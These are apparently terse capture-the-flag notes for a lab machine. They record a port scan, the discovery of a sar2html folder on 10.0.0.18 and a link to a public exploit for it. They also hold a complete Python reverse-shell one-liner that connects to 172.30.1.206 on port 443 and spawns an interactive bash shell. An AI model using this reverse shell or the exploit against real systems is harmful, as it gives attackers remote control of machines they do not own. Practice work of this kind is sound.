# monitoringmachinectf

Try to use HNMAP or NMAP on terminal to Discover the ports that are open and also services
Apache Currently running on 10.0.0.18
PHP too
10.0.0.18
Inspect Element
Got an Instruction of use index2.html as resource for the CTF
Inspecting index2.html 
Discovered that sar2html folder should have something
http://10.0.0.18/sar2html/

https://www.exploit-db.com/exploits/47204

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.30.1.206",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'


35a63cd9437a1447e0c447533875adf312b468211
